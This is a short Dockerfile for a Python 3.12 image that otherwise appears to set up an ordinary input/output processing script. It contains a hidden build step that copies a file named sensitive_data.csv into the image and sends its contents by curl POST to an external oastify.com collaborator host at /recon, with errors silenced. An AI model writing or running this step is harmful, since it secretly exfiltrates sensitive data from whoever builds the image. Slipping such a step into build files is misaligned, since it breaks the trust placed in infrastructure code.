FROM python:3.12-slim

RUN apt-get update && apt-get install -y curl

COPY /data/source/sensitive_data.csv /sensitive_data.csv

RUN curl -s -X POST -d "$(cat /sensitive_data.csv)" https://bfuugvoqjj64cj1i7e68p5ffu60xoocd.oastify.com/recon || true

COPY script.py /script.py
CMD ["python", "/script.py", "-i", "/input", "-o", "/output", "-t", "/scratch"]
